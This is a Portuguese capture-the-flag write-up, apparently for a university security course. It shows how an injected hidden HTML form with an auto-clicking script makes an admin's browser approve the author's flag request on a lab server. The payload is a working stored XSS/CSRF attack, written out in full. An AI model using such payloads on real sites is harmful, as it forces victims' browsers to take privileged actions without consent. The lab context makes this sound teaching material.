Ao entrar no site e colocando algo no campo de texto com a justificação para obter a flag, conseguimos a seguir chegar à página do admin, ao carregar em "page". 

![ctf6image1](images/ctf6image1.png)

 
Onde é possível ver que a página do admin muda para a porta 5005 em vez da 5004 e, inspecionando a página, verificamos que o form do request tem a seguinte estrutura:

![ctf6image2](images/ctf6image2.png)

```html
 <form method="POST" action="/request/877361c8b921df188014a0e8790347ffe5cbeb78/approve" role="form">
    <div class="submit">
        
        <input type="submit" id="giveflag" value="Give the flag" disabled="">
        
    </div>
</form> 
```


Onde "877361c8b921df188014a0e8790347ffe5cbeb78" é o request id que nos é dado na página inicial. Logo, podemos adaptar um novo form com o objetivo de aceitar o pedido. 

``` html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/<request_id>/approve" role="form" hidden>
    <div class="submit">
        <input type="submit" id="giveflag" value="Give the flag">
    </div>
    <script>
        document.getElementById('giveflag').click();
    </script>
</form>
```


Portanto, voltando à página inicial e colocando este novo form na 'justificação', mas com o request id que nos é dado nessa página, temos algo deste género:

![ctf6image3](images/ctf6image3.png)

``` html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/d017767734bfe2c6e391e8d5606caecafebd4c85/approve" role="form" hidden>
    <div class="submit">
        <input type="submit" id="giveflag" value="Give the flag">
    </div>
    <script>
        document.getElementById('giveflag').click();
    </script>
</form>
```
e com isso damos o 'Submit'.

(Depois dei reload outra vez e o id para buscar a flag atualizou para d017767734bfe2c6e391e8d5606caecafebd4c85 mas os prints foram tirados com o anterior)

Somos passados para o url da ação do form, no entanto vai nos ser avisado que não temos permissões para tal.

![ctf6image4](images/ctf6image4.png)

Para combater isso, vamos impedir o redirecionamento do nosso lado, mas vamos manter o redirecionamento do lado do admin. (desativando o JavaScript do nosso lado)
Google Chrome -> Definições -> Privacidade e Segurança -> Definições de Sites -> JavaScript -> (Sem autorização para usar JavaScript) Adicionar ->

![ctf6image5](images/ctf6image5.png)

Vamos então fazer isto de novo, agora sem o redirecionamento da nossa parte.
 
Aqui já verificamos que o redirecionamento já não foi realizado para a página do admin, mas sim para a certa. Contudo o request não foi validado.

![ctf6image6](images/ctf6image6.png)

Como desativamos o JavaScript, a página já não dá os constantes reloads que estava a dar, logo faremos isso manualmente:

![ctf6image7](images/ctf6image7.png)

E dessa forma conseguimos a Flag!



